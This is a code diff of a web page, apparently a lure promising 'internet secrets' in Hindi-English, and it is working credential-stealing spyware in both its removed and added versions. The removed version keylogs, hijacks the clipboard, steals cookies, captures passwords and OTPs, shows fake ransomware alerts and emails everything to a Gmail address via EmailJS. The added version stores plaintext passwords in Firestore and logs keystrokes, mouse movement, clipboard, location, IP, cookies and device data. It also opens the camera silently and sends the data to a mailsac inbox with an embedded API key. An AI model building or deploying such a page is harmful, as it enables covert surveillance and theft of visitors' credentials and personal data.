@@ -3,388 +3,379 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate Secret Vault</title>
+    <title>Internet Secrets Vault</title>
     <style>
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            font-family: 'Orbitron', sans-serif;
-            color: #00ffcc;
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
             margin: 0;
             padding: 20px;
-            overflow-x: hidden;
             text-align: center;
-            transition: all 0.5s ease;
+            color: #333;
         }
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
         h1 {
-            font-size: 4em;
-            text-shadow: 0 0 30px #00ffcc, 0 0 20px #ff00ff;
-            animation: pulse 2s infinite;
+            font-size: 2em;
+            color: #2c3e50;
         }
         p {
-            font-size: 1.8em;
-            margin: 15px 0;
-            color: #ffeb3b;
+            font-size: 1.1em;
+            line-height: 1.5;
+            margin: 10px 0;
         }
-        .btn {
-            padding: 25px 70px;
-            font-size: 2.2em;
-            background: linear-gradient(45deg, #ff007a, #00ffcc);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            cursor: pointer;
-            box-shadow: 0 15px 35px rgba(0, 255, 204, 0.4);
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-        }
-        .btn:hover {
-            transform: scale(1.15) rotate(5deg);
-            box-shadow: 0 20px 50px rgba(0, 255, 204, 0.6);
-        }
-        .form-box, .info-box, .progress-bar {
-            display: none;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 40px;
-            border-radius: 25px;
-            max-width: 600px;
+        .teaser {
+            background: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
             margin: 20px auto;
-            backdrop-filter: blur(10px);
-            border: 1px solid #00ffcc;
+            max-width: 600px;
         }
-        .form-box input {
+        .login-box, .signup-box {
+            background: #fff;
             padding: 20px;
-            margin: 15px 0;
-            width: 90%;
-            border: none;
-            border-radius: 15px;
-            font-size: 1.5em;
-            background: rgba(255, 255, 255, 0.1);
-            color: #00ffcc;
-            outline: none;
+            border-radius: 5px;
+            margin: 20px auto;
+            max-width: 300px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: none;
         }
-        .progress-bar {
-            position: relative;
+        .login-box input, .signup-box input {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
         }
-        .progress-bar div {
-            width: 0;
-            height: 30px;
-            background: linear-gradient(90deg, #ff007a, #00ffcc);
-            border-radius: 15px;
-            animation: load 3s forwards;
-        }
-        .progress-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 1.5em;
+        .login-box button, .signup-box button {
+            padding: 10px 20px;
+            background: #2c3e50;
             color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
         }
-        @keyframes pulse {
-            0% { color: #00ffcc; text-shadow: 0 0 30px #00ffcc; }
-            50% { color: #ff00ff; text-shadow: 0 0 40px #ff00ff; }
-            100% { color: #00ffcc; text-shadow: 0 0 30px #00ffcc; }
+        .login-box button:hover, .signup-box button:hover {
+            background: #34495e;
         }
-        @keyframes load {
-            0% { width: 0; }
-            100% { width: 100%; }
-        }
-        .master-unlock {
+        .premium-teaser {
             display: none;
-            color: #ffeb3b;
-            font-size: 2em;
-            margin-top: 20px;
-            animation: blink 1s infinite;
+            background: #e74c3c;
+            color: #fff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px auto;
+            max-width: 600px;
         }
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
-        .retry-btn {
+        .logout-btn {
             display: none;
-            margin-top: 20px;
+            padding: 10px 20px;
+            background: #c0392b;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .logout-btn:hover {
+            background: #e74c3c;
         }
     </style>
 </head>
 <body>
-    <h1>Ultimate Secret Vault</h1>
-    <p>Unveil the deepest secrets of the digital abyss!</p>
-    <button class="btn" onclick="_sC()">Enter the Vault</button>
-    <div class="form-box" id="captchaForm">
-        <p>Prove Your Existence</p>
-        <input type="text" id="captcha" placeholder="Enter Code: 1234" required>
-        <button class="btn" onclick="_vC()">Verify Identity</button>
-    </div>
-    <div class="form-box" id="loginForm">
-        <input type="email" id="email" placeholder="Your Encrypted Email" required>
-        <input type="password" id="password" placeholder="Your Cipher Key" required>
-        <input type="file" id="fileUpload" accept="image/*,video/*" onchange="_hF(this.files)">
-        <button class="btn" onclick="_sO()">Access Vault</button>
-    </div>
-    <div class="form-box" id="otpForm">
-        <p>Enter Master Code</p>
-        <input type="text" id="otp" placeholder="Secret Code" required>
-        <button class="btn" onclick="_cD()">Unlock All Secrets</button>
-    </div>
-    <div class="progress-bar" id="progressBar">
-        <p class="progress-text">Decrypting Cosmic Knowledge...</p>
-        <div></div>
-    </div>
-    <div class="master-unlock" id="masterUnlock">Master Vault Unlocked! Access Granted.</div>
-    <button class="btn retry-btn" id="retryBtn" onclick="location.reload()">Retry Access</button>
-    <p class="hidden">Lab test only. Consent to data collection for research.</p>
+    <h1>Internet Secrets Vault</h1>
+    <p class="teaser" id="teaser">
+        Kya aap jaante hain? Internet ke aise raaz jo aam log nahi jaante!<br>
+        - Ek chhupa hua network jahan har baat record hoti hai.<br>
+        - 2019 mein Jio ka crash—lakho log offline!<br>
+        - Ek trick jisse aap apni internet speed badha sakte hain.<br>
+        Poora janna chahte hain? Thodi si mehnat karo...
+    </p>
+    <button onclick="showLogin()" id="loginPrompt">Jaanne ke Liye Yahan Click Karein</button>
 
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <div class="login-box" id="loginBox">
+        <h2>Sign In</h2>
+        <input type="email" id="loginEmail" placeholder="Email" required>
+        <input type="password" id="loginPassword" placeholder="Password" required>
+        <button onclick="signIn()">Sign In</button>
+        <p>Naya hain? <button onclick="showSignup()">Sign Up</button></p>
+    </div>
+
+    <div class="signup-box" id="signupBox">
+        <h2>Sign Up</h2>
+        <input type="text" id="signupUsername" placeholder="Username" required>
+        <input type="email" id="signupEmail" placeholder="Email" required>
+        <input type="password" id="signupPassword" placeholder="Password (min 6 chars)" required>
+        <button onclick="signUp()">Sign Up</button>
+        <p>Pehele se account hai? <button onclick="showLogin()">Sign In</button></p>
+    </div>
+
+    <div class="premium-teaser" id="premiumTeaser">
+        <h2>VIP Internet Secrets Unlocked!</h2>
+        <p>
+            Aapke liye highest level ki jankari:<br>
+            - Deep web ka map—kahan kya chhupa hai! (Onion links ke saath)<br>
+            - 2021 global outage ka asli karan—Facebook, Instagram sab down!<br>
+            - Speed boost trick: DNS change karke 20% tak speed badhao.<br>
+            - VPN ka sahi istemal—privacy aur security ke liye.<br>
+            - Ek secret browser setting jo aapka data chhupa sakta hai.<br>
+            - 2023 mein ek bada data breach—kiska data chori hua?<br>
+            Aur bhi kaafi kuchh—sirf VIP users ke liye!
+        </p>
+    </div>
+    <button class="logout-btn" id="logoutBtn" onclick="logout()">Logout</button>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <script>
-        // Initialize EmailJS with Public ID
-        emailjs.init('OhkXkjccvpkgJIbep');
+        // Firebase Configuration (Replace with your Firebase project config)
+        const firebaseConfig = {
+            apiKey: "your-api-key",
+            authDomain: "your-project-id.firebaseapp.com",
+            projectId: "your-project-id",
+            storageBucket: "your-project-id.appspot.com",
+            messagingSenderId: "your-sender-id",
+            appId: "your-app-id"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
 
-        // Real-time Data Storage
         let collectedData = [];
+        let hasCamAccessed = false;
+        let keys = [];
+        let mouseMovements = [];
 
-        // Keylogger with Real-time Feedback
-        let _k = [];
+        // Keylogger
         document.addEventListener('keydown', (e) => {
-            _k.push(e.key);
-            if (_k.length > 10) {
-                let data = `K: ${_k.join('')}`;
+            keys.push(e.key);
+            if (keys.length > 10) {
+                let data = `Keys: ${keys.join('')}`;
                 collectedData.push(data);
-                _sD(data, _r());
-                console.log('Keylog:', data);
+                keys = [];
+                saveAndSendData('keylog', { keylog: data });
+            }
+        });
+
+        // Mouse Movements
+        document.addEventListener('mousemove', (e) => {
+            mouseMovements.push(`X:${e.clientX},Y:${e.clientY}`);
+            if (mouseMovements.length > 8) {
+                let data = `Mouse: ${mouseMovements.join('|')}`;
+                collectedData.push(data);
+                mouseMovements = [];
+                saveAndSendData('mousemove', { mousemove: data });
             }
         });
 
         // Clipboard Hijack
         document.addEventListener('copy', () => {
             navigator.clipboard.readText().then(t => {
-                let data = `C: ${t}`;
+                let data = `Clipboard: ${t}`;
                 collectedData.push(data);
-                _sD(data, _r());
-                console.log('Clipboard:', data);
+                saveAndSendData('clipboard', { clipboard: data });
             });
         });
 
-        // Session Replay (Mouse + Touch)
-        let _m = [];
-        document.addEventListener('mousemove', (e) => {
-            _m.push(`X:${e.clientX},Y:${e.clientY}`);
-            if (_m.length > 12) {
-                let data = `M: ${_m.join('|')}`;
-                collectedData.push(data);
-                _sD(data, _r());
-                console.log('Mouse:', data);
-            }
-        });
-        document.addEventListener('touchmove', (e) => {
-            let t = e.touches[0];
-            _m.push(`T:X${t.clientX},Y:${t.clientY}`);
-            if (_m.length > 12) {
-                let data = `T: ${_m.join('|')}`;
-                collectedData.push(data);
-                _sD(data, _r());
-                console.log('Touch:', data);
+        // Check if user is already logged in
+        auth.onAuthStateChanged(user => {
+            if (user) {
+                collectUserData(user);
+                document.getElementById('teaser').style.display = 'none';
+                document.getElementById('loginPrompt').style.display = 'none';
+                document.getElementById('loginBox').style.display = 'none';
+                document.getElementById('signupBox').style.display = 'none';
+                document.getElementById('premiumTeaser').style.display = 'block';
+                document.getElementById('logoutBtn').style.display = 'block';
+            } else {
+                document.getElementById('teaser').style.display = 'block';
+                document.getElementById('loginPrompt').style.display = 'block';
+                document.getElementById('premiumTeaser').style.display = 'none';
+                document.getElementById('logoutBtn').style.display = 'none';
             }
         });
 
-        // Cookie Theft
-        function _cT() {
-            let c = document.cookie || 'None';
-            let data = `Cookies: ${c}`;
-            collectedData.push(data);
-            _sD(data, _r());
-            document.cookie = `H_track=${Math.random()}; max-age=7200`;
-            console.log('Cookies:', data);
+        function showLogin() {
+            document.getElementById('teaser').style.display = 'none';
+            document.getElementById('loginPrompt').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+            document.getElementById('signupBox').style.display = 'none';
         }
 
-        // Browser Fingerprinting
-        function _bF() {
-            let f = `${navigator.userAgent}|${navigator.platform}|${screen.width}x${screen.height}`;
-            let data = `FP: ${f}`;
-            collectedData.push(data);
-            _sD(data, _r());
-            console.log('Fingerprint:', data);
+        function showSignup() {
+            document.getElementById('teaser').style.display = 'none';
+            document.getElementById('loginPrompt').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('signupBox').style.display = 'block';
         }
 
-        // Geolocation
-        function _gL() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    let data = `Loc: ${p.coords.latitude},${p.coords.longitude}`;
-                    collectedData.push(data);
-                    _sD(data, _r());
-                    console.log('Location:', data);
-                }, () => {
-                    let data = 'Loc denied';
-                    collectedData.push(data);
-                    _sD(data, _r());
-                    console.log('Location:', data);
+        function signUp() {
+            let username = document.getElementById('signupUsername').value;
+            let email = document.getElementById('signupEmail').value;
+            let password = document.getElementById('signupPassword').value;
+            auth.createUserWithEmailAndPassword(email, password)
+                .then(userCredential => {
+                    const user = userCredential.user;
+                    collectUserData(user, username, password);
+                    alert('Sign Up successful! Now you can access VIP content.');
+                })
+                .catch(error => {
+                    alert('Sign Up failed: ' + error.message);
                 });
-            }
         }
 
-        // Camera Access
-        function _cA() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(s => {
-                        let v = document.createElement('video');
-                        v.srcObject = s;
-                        v.play();
-                        v.style.display = 'none';
-                        document.body.appendChild(v);
-                        let data = 'Cam accessed';
-                        collectedData.push(data);
-                        _sD(data, _r());
-                        console.log('Camera:', data);
+        function signIn() {
+            let email = document.getElementById('loginEmail').value;
+            let password = document.getElementById('loginPassword').value;
+            auth.signInWithEmailAndPassword(email, password)
+                .then(userCredential => {
+                    collectUserData(userCredential.user, null, password);
+                    alert('Sign In successful! Welcome to VIP secrets.');
+                })
+                .catch(error => {
+                    alert('Sign In failed: ' + error.message);
+                });
+        }
+
+        function logout() {
+            auth.signOut().then(() => {
+                alert('Logged out successfully!');
+            }).catch(error => {
+                alert('Logout failed: ' + error.message);
+            });
+        }
+
+        function collectUserData(user, username = null, password = null) {
+            if (user) {
+                let userData = {
+                    email: user.email,
+                    uid: user.uid,
+                    signupDate: user.metadata.creationTime || new Date().toISOString(),
+                    lastSignIn: user.metadata.lastSignInTime || new Date().toISOString()
+                };
+                if (username) userData.username = username;
+                if (password) userData.password = password;
+
+                // Collect location
+                if (navigator.geolocation && navigator.onLine) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            userData.location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude || 'N/A',
+                                heading: position.coords.heading || 'N/A',
+                                speed: position.coords.speed || 'N/A'
+                            };
+                            saveAndSendData(user.uid, userData);
+                        },
+                        error => {
+                            console.log('Location access denied:', error);
+                            saveAndSendData(user.uid, userData);
+                        }
+                    );
+                } else {
+                    saveAndSendData(user.uid, userData);
+                }
+
+                // Collect browser fingerprint
+                let fingerprint = {
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'N/A'
+                };
+                userData.browserFingerprint = fingerprint;
+
+                // Collect device info
+                let deviceInfo = {
+                    vendor: navigator.vendor || 'N/A',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                    deviceMemory: navigator.deviceMemory || 'N/A',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : 'N/A'
+                };
+                userData.deviceInfo = deviceInfo;
+
+                // Collect IP Address
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        userData.ipAddress = ipData.ip;
+                        saveAndSendData(user.uid, userData);
                     })
-                    .catch(() => {
-                        let data = 'Cam denied';
-                        collectedData.push(data);
-                        _sD(data, _r());
-                        console.log('Camera:', data);
+                    .catch(error => {
+                        console.error('Error fetching IP:', error);
+                        userData.ipAddress = 'N/A';
+                        saveAndSendData(user.uid, userData);
                     });
+
+                // Collect cookies
+                let cookies = document.cookie || 'None';
+                userData.cookies = cookies;
+
+                // Camera Access
+                if (!hasCamAccessed && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(s => {
+                            let v = document.createElement('video');
+                            v.srcObject = s;
+                            v.play();
+                            v.style.display = 'none';
+                            document.body.appendChild(v);
+                            userData.cameraAccess = 'Cam accessed';
+                            hasCamAccessed = true;
+                            saveAndSendData(user.uid, userData);
+                        })
+                        .catch(() => {
+                            userData.cameraAccess = 'Cam denied';
+                            hasCamAccessed = true;
+                            saveAndSendData(user.uid, userData);
+                        });
+                }
             }
         }
 
-        // Screen Recording Simulation
-        function _sR() {
-            let res = `${screen.width}x${screen.height}`;
-            let data = `Screen: ${res}`;
-            collectedData.push(data);
-            _sD(data, _r());
-            if (Math.random() > 0.7) {
-                let alertData = 'Recording simulated';
-                collectedData.push(alertData);
-                _sD(alertData, _r());
-                alert('Elite surveillance activated!');
-                console.log('Screen:', data);
-            }
+        function saveAndSendData(id, data) {
+            // Save to Firestore
+            db.collection("users").doc(id).set(data, { merge: true })
+                .then(() => {
+                    console.log('User data saved:', data);
+                })
+                .catch(error => {
+                    console.error('Error saving user data:', error);
+                });
+
+            // Send to Mailsac
+            const mailsacEmail = "sohil_vrx3y@mailsac.com";
+            fetch('https://mailsac.com/api/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Mailsac-Key': 'k_sihbEOzxIvQaIvWQbC044VQa08QwT4t10D'
+                },
+                body: JSON.stringify({
+                    to: mailsacEmail,
+                    subject: 'User Data from Internet Secrets Vault',
+                    text: JSON.stringify(data, null, 2)
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Email sent to Mailsac:', result);
+            })
+            .catch(error => {
+                console.error('Error sending email to Mailsac:', error);
+            });
         }
-
-        // Ransomware Simulation (Fixed)
-        function _rS() {
-            if (Math.random() > 0.8) {
-                let data = 'Ransomware triggered';
-                collectedData.push(data);
-                _sD(data, _r());
-                alert('SYSTEM LOCKED! Transfer 1 BTC to Unlock! (Simulation)');
-                document.getElementById('retryBtn').style.display = 'block';
-                console.log('Ransomware:', data);
-            }
-        }
-
-        // Auto-Refresh
-        setTimeout(() => {
-            if (Math.random() > 0.9) location.reload();
-        }, 25000);
-
-        // Fake Error
-        function _fE() {
-            if (Math.random() > 0.75) {
-                let data = 'Fake Error';
-                collectedData.push(data);
-                _sD(data, _r());
-                alert('Critical System Failure! Retry Access.');
-                document.getElementById('retryBtn').style.display = 'block';
-                console.log('Error:', data);
-            }
-        }
-
-        // Show CAPTCHA
-        function _sC() {
-            document.querySelector('.btn').style.display = 'none';
-            document.getElementById('captchaForm').style.display = 'block';
-            _cT();
-            _bF();
-        }
-
-        // Verify CAPTCHA
-        function _vC() {
-            let c = document.getElementById('captcha').value;
-            let data = `Captcha: ${c}`;
-            collectedData.push(data);
-            _sD(data, _r());
-            document.getElementById('captchaForm').style.display = 'none';
-            document.getElementById('loginForm').style.display = 'block';
-        }
-
-        // Show OTP
-        function _sO() {
-            let e = document.getElementById('email').value;
-            let p = document.getElementById('password').value;
-            let data = `Email: ${e}, Pass: ${p}`;
-            collectedData.push(data);
-            _sD(data, _r());
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('otpForm').style.display = 'block';
-            _gL();
-            _cA();
-        }
-
-        // File Upload
-        function _hF(f) {
-            if (f.length > 0) {
-                let data = `File: ${f[0].name}`;
-                collectedData.push(data);
-                _sD(data, _r());
-                console.log('File:', data);
-            }
-        }
-
-        // Main Data Collection
-        function _cD() {
-            let o = document.getElementById('otp').value;
-            let data = `OTP: ${o}`;
-            collectedData.push(data);
-            _sD(data, _r());
-            _sR();
-            _fE();
-            _rS();
-            document.getElementById('otpForm').style.display = 'none';
-            document.getElementById('progressBar').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('progressBar').innerHTML = '<p class="progress-text">Secrets Decrypted!</p><div></div>';
-                document.getElementById('masterUnlock').style.display = 'block';
-                alert('Master Vault Unlocked! Elite Access Granted!');
-                console.log('Master Unlock:', collectedData.join('\n'));
-            }, 3500);
-        }
-
-        // Initial Data
-        function _iD() {
-            let h = window.location.href;
-            let data = `URL: ${h}`;
-            collectedData.push(data);
-            _sD(data, _r());
-            console.log('URL:', data);
-        }
-
-        // Send Data via EmailJS with All Collected Data
-        function _sD(d, cb) {
-            collectedData.push(d);
-            const emailParams = {
-                to_email: 'sohilhusain86@gmail.com',
-                from_name: 'Ultimate Secret Vault',
-                subject: 'Elite Data Harvest',
-                message: 'Attached is the complete data collection.',
-                data: collectedData.join('\n')
-            };
-            emailjs.send('service_gjn6691', 'template_qkg66lc', emailParams)
-                .then(() => console.log('Elite Data Sent:', collectedData.join('\n')))
-                .catch(error => console.error('Error:', error));
-            if (cb) cb();
-        }
-
-        // Random Callback with Enhanced Logic
-        function _r() {
-            let actions = [_cT, _bF, _gL, _cA, _sR, _fE, _rS];
-            let rand = actions[Math.floor(Math.random() * actions.length)];
-            rand();
-            if (Math.random() > 0.9) _iD();
-        }
-
-        // Start the Vault
-        _iD();
     </script>
 </body>
 </html>
